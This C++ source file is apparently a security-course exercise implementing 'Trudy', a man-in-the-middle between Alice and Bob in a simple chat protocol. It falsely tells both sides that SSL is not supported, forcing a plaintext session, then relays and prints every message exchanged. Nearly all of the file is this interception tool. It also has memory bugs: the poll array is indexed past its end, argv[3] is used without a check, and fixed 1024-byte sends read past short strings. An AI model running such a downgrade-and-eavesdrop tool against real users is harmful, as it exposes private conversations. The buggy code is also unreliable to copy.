#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/crypto.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <iostream>
#include <netdb.h>
#include <sys/poll.h>
#include <cstring>   //For strlen()
#include <unistd.h> //For close()

void type_server_client(char *server_name){

int port;
std::cout<<"Please enter the Port on Which the Server Should listen..."<<std::endl;
std::cin>>port;
/*

*/
    /*### AS SERVER ###*/

    char * hello_server= "chat_hello_ACK";
    char * hello_ssl_server="chat_START_SSL_ACK";
    char * trudy_hello_ssl="chat_START_SSL_NOT_SUPPORTED";
    std::string ip_address="0.0.0.0";
    int flags,new_socket,valread;
    char buffer[1024] = {0};

    struct sockaddr_in address;
    int addr_len = sizeof(address);
    address.sin_addr.s_addr=INADDR_ANY;
    address.sin_port=htons(port);
    address.sin_family=AF_INET;
    inet_pton(AF_INET,ip_address.c_str(), &(address.sin_addr));
    memset(&(address.sin_zero), '\0', 8);

    int sockid = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(sockid==-1){
        std::cout<<"The socket could not be created"<<std::endl;
        std::exit(1);
    }
    int opt=1;

    if (setsockopt(sockid, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                  &opt, sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    if(bind(sockid,(struct sockaddr *)&address,sizeof(address))!=-1){
        std::cout<<"Bind Successfull on Port "<< port<< " and Address "<<address.sin_addr.s_addr<<std::endl;
    }
    int status = listen(sockid,2);
    if(status < 0){
    std::cout<<"The Listen on Requested Port failed"<<std::endl;
    std::exit(1);
    }
    new_socket = accept(sockid, (struct sockaddr *)&address,(socklen_t*)&addr_len);
    if(!new_socket){   
        std::cout<<"The Connection could not be accepted"<<std::endl;
        std::exit(1);
    }
    std::cout<<"Connection Accepted of Client"<<std::endl;
    
    //Start Chat Hello
    valread = recv(new_socket ,buffer, 1024,0);
    if(valread!=-1){
    std::cout<<"The Message received from Client: "<<buffer<<std::endl;
    }
    int valsent = send(new_socket , hello_server , 1024, 0 );

    //Start SSL Chat Hello
    memset(buffer, 0, sizeof(buffer));

    valread = recv(new_socket ,buffer, 1024,0);
    if(valread!=-1){
    std::cout<<"The Message received from Client: "<<buffer<<std::endl;
    }
    valsent = send(new_socket ,"chat_START_SSL_NOT_SUPPORTED", strlen("chat_START_SSL_NOT_SUPPORTED"), 0 );
    //valsent = send(new_socket ,trudy_hello_ssl, 1024, 0 );


    /*### AS CLIENT ###*/

    std::cout<<"Please enter the Port on which to connect to Server(Behaving as Client)..."<<std::endl;
    std::cin>>port;

    struct hostent* host = gethostbyname(server_name); //This resolves the domain name with the IP address..
    if (host == NULL) {
        std::cout << "Failed to find the hostname: " << std::endl;
        exit(1);
    }

    const char * hello_client="chat_hello";
    const char * hello_ssl_client="chat_START_SSL";
    //std::string ip_address="127.0.0.1";
    
    struct sockaddr_in address_client;

    address_client.sin_port=htons(port);
    address_client.sin_family=AF_INET;
    address_client.sin_addr= *((struct in_addr*)host->h_addr_list[0]);
    //inet_pton(AF_INET,ip_address.c_str(), &(address.sin_addr));
    memset(&(address_client.sin_zero),'\0',8);
    int client_socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);


    int value_connect=connect(client_socket,(struct sockaddr *)&address_client,sizeof(address_client));
    //printf("%d\n", value_connect);
    if(value_connect < 0){
        std::cout<<"Connect Failed..Exiting.."<<std::endl;
        exit(1);
    }
    if(value_connect!=-1){
        std::cout<<"Connection Successfull on Port "<< port<< "and Address "<<address.sin_addr.s_addr<<std::endl;
    }
        //Start Chat Hello
        int val_sent=send(client_socket , hello_client , 1024, 0);
        valread = recv(client_socket ,buffer, 1024,0);
        std::cout<<"The Message received from Server: "<<buffer<<std::endl;

        //Start Chat SSL Hello
        memset(buffer, 0, sizeof(buffer));

        val_sent=send(client_socket , trudy_hello_ssl , 1024, 0);
        //valread = recv(client_socket ,buffer, 1024,0);
        //std::cout<<"The Message received from Server: "<<buffer<<std::endl;

        /*
        ############################################################################# 
        Now proceeding with intruding the traffic of Alice and Bob via TCP transfer...
        #############################################################################
        */
       // char buff_cipher[1024]={0};

    struct pollfd fds[1];
    
    fds[0].fd = client_socket;  //Client Socket FD.
    fds[0].events = POLLIN;
    fds[1].fd = new_socket;         //Server Socket FD.
    fds[1].events = POLLIN;
    
    //int n_clients = 0;

        while(poll(fds, 2, -1)!=-1){
        char buf[1024];
        memset(buf,0,1024);
        if (fds[0].revents & POLLIN) {
            ssize_t len = read(client_socket, buf, sizeof(buf));
            if (len > 0) {
                    printf("Server sent..: %d, %s", (int)len, buf);    
                    write(new_socket,buf,1024);
                    if(strcmp(buf,"chat_close\n")==0){
                    close(client_socket);
                    close(new_socket);
                    break;
                }
            }
        }
        if (fds[1].revents & POLLIN) {
            ssize_t len = read(new_socket,buf,1024);
            if (len > 0) {
                printf("Client sent..: %d, %s", (int)len, buf);
                write(client_socket,buf,1024);
                if(strcmp(buf,"chat_close\n")==0){
                    close(new_socket);
                    close(client_socket);
                    break;
                }
            }
        }
    }
}

int main(int argc, char *argv[]){
    if (argc == 1) {
        std::cout << "Please Pass an argument and try again" << std::endl;
        exit(1);
        }
    if((strcmp(argv[1],"-d") == 0)){
        type_server_client(argv[3]);
    }
    else{
        std::cout<<"There is an Error in which you are giving the arguments..Please check"<<std::endl;
        exit(1);
    }

return 0;
}
